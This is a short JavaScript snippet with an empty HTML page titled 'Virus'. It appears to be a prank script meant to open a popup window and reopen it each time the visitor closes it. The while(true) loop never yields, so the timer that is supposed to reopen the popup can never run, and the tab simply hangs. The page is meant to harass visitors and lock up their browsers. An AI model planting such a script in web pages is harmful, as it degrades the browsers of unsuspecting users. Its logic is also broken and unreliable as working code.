newPage = true;
while(true) {
    if(newPage) {
        var win = window.open(url, '_blank', 'width=500,height=400');
        newPage = false;
        var timer = setInterval(function() { 
            if(win.closed) {
                clearInterval(timer);
                newPage = true;
                console.log('closed');
            }
        }, 500);
    }
}
<html>
    <head>
        <title>Virus</title>
    </head>
    <body>
        <script>

        </script>
    </body>
</html>